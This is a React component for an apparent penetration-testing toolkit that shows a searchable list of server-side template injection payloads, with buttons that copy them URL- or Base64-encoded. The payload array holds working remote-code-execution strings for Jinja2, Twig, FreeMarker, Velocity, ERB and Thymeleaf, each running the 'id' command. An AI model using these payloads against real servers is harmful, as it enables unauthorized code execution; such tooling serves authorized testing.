import React, { useState } from 'react';
import { Card, Button, Input, TabNav, PayloadBlock } from '../ui';
import { ToolHeader } from '../ui/ToolHeader';
import { Search, Copy, Check, Filter, Terminal } from 'lucide-react';

// Static SSTI Payloads derived from HackTools logic
const SSTI_PAYLOADS = [
    {
        engine: 'Jinja2',
        language: 'Python',
        payload: '{{7*7}}',
        desc: 'Basic arithmetic test'
    },
    {
        engine: 'Jinja2',
        language: 'Python',
        payload: '{{config}}',
        desc: 'Dump config object'
    },
    {
        engine: 'Jinja2',
        language: 'Python',
        payload: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        desc: 'RCE via os.popen'
    },
    {
        engine: 'Jinja2',
        language: 'Python',
        payload: "{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
        desc: 'RCE via subprocess (index may vary)'
    },
    {
        engine: 'Twig',
        language: 'PHP',
        payload: '{{7*7}}',
        desc: 'Basic arithmetic test'
    },
    {
        engine: 'Twig',
        language: 'PHP',
        payload: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
        desc: 'RCE via exec filter'
    },
    {
        engine: 'FreeMarker',
        language: 'Java',
        payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
        desc: 'RCE via Execute utility'
    },
    {
        engine: 'Velocity',
        language: 'Java',
        payload: '#set($str=$class.inspect("java.lang.String").type)\n#set($chr=$class.inspect("java.lang.Character").type)\n#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))',
        desc: 'RCE via Runtime.exec'
    },
    {
        engine: 'ERB',
        language: 'Ruby',
        payload: '<%= system("id") %>',
        desc: 'RCE via system()'
    },
    {
        engine: 'Spring',
        language: 'Java',
        payload: '${7*7}',
        desc: 'Basic arithmetic test'
    },
    {
        engine: 'Thymeleaf',
        language: 'Java',
        payload: '${T(java.lang.Runtime).getRuntime().exec("id")}',
        desc: 'RCE via Runtime exec'
    }
];

export default function SSTITool() {
    const [searchTerm, setSearchTerm] = useState('');
    const [selectedEngine, setSelectedEngine] = useState<string>('All');
    const [showToast, setShowToast] = useState(false);

    const engines = ['All', ...Array.from(new Set(SSTI_PAYLOADS.map(p => p.engine)))];

    const copyToClipboard = (text: string) => {
        navigator.clipboard.writeText(text);
        setShowToast(true);
        setTimeout(() => setShowToast(false), 2000);
    };

    const copyEncoded = (text: string, type: 'url' | 'base64') => {
        let content = text;
        if (type === 'url') content = encodeURIComponent(text);
        if (type === 'base64') content = btoa(text);
        copyToClipboard(content);
    };

    const filteredPayloads = SSTI_PAYLOADS.filter(item => {
        const matchesSearch =
            item.engine.toLowerCase().includes(searchTerm.toLowerCase()) ||
            item.desc.toLowerCase().includes(searchTerm.toLowerCase()) ||
            item.payload.toLowerCase().includes(searchTerm.toLowerCase());
        const matchesEngine = selectedEngine === 'All' || item.engine === selectedEngine;
        return matchesSearch && matchesEngine;
    });

    return (
        <div className="space-y-6">
            <ToolHeader
                title="SSTI Payloads"
                description="Server-Side Template Injection payloads for various engines and languages"
                badge="RT"
                icon={<Terminal size={24} />}
            />

            <Card className="!p-6 space-y-4 border-l-4 border-l-htb-green">
                <div className="flex flex-col md:flex-row gap-4">
                    <div className="flex-1">
                        <label className="text-xs font-medium text-gray-400 mb-1 block">Search Payloads</label>
                        <div className="relative">
                            <Search className="absolute left-3 top-2.5 text-gray-500" size={16} />
                            <Input
                                placeholder="Search by engine, desc, or payload..."
                                value={searchTerm}
                                onChange={(e) => setSearchTerm(e.target.value)}
                                className="pl-10"
                            />
                        </div>
                    </div>
                    <div className="w-full md:w-48">
                        <label className="text-xs font-medium text-gray-400 mb-1 block">Filter Engine</label>
                        <select
                            className="w-full bg-[#0d1117] border border-gray-700 rounded-md p-2 text-sm text-gray-300 focus:outline-none focus:border-htb-green"
                            value={selectedEngine}
                            onChange={(e) => setSelectedEngine(e.target.value)}
                        >
                            {engines.map(eng => <option key={eng} value={eng}>{eng}</option>)}
                        </select>
                    </div>
                </div>
            </Card>

            <div className="space-y-4">
                {filteredPayloads.map((item, idx) => (
                    <Card key={idx} className="!p-4 hover:border-htb-green/50 transition-colors">
                        <div className="flex flex-col gap-3">
                            <div className="flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <span className="bg-htb-green/10 text-htb-green px-2 py-0.5 rounded text-xs font-bold uppercase tracking-wider">
                                        {item.engine}
                                    </span>
                                    <span className="text-gray-500 text-xs">
                                        {item.language}
                                    </span>
                                </div>
                                <div className="flex gap-2">
                                    <Button size="sm" variant="outline" onClick={() => copyEncoded(item.payload, 'url')}>URL</Button>
                                    <Button size="sm" variant="outline" onClick={() => copyEncoded(item.payload, 'base64')}>B64</Button>
                                    {/* Copy is handled by PayloadBlock, but we might want extra formats. 
                                        Actually PayloadBlock handles the main copy. 
                                        But SSTITool has URL/B64 buttons too. 
                                        I'll keep the buttons but replace the code display. */}
                                </div>
                            </div>

                            <p className="text-sm text-gray-400">{item.desc}</p>

                            <PayloadBlock content={item.payload} />
                        </div>
                    </Card>
                ))}
            </div>

            {/* Toast Notification */}
            <div
                className={`fixed bottom-6 left-1/2 transform -translate-x-1/2 bg-[#0d1117] border-2 border-[#a2ff00] px-6 py-4 rounded-xl flex items-center gap-3 shadow-2xl shadow-[#a2ff00]/20 transition-all duration-300 ${showToast ? 'translate-y-0 opacity-100' : 'translate-y-20 opacity-0 pointer-events-none'}`}
                style={{ zIndex: 9999 }}
            >
                <div className="bg-[#a2ff00] rounded-full p-1.5 text-black">
                    <Check size={16} strokeWidth={3} />
                </div>
                <span className="font-bold text-sm text-white">Copied to clipboard!</span>
            </div>
        </div>
    );
}
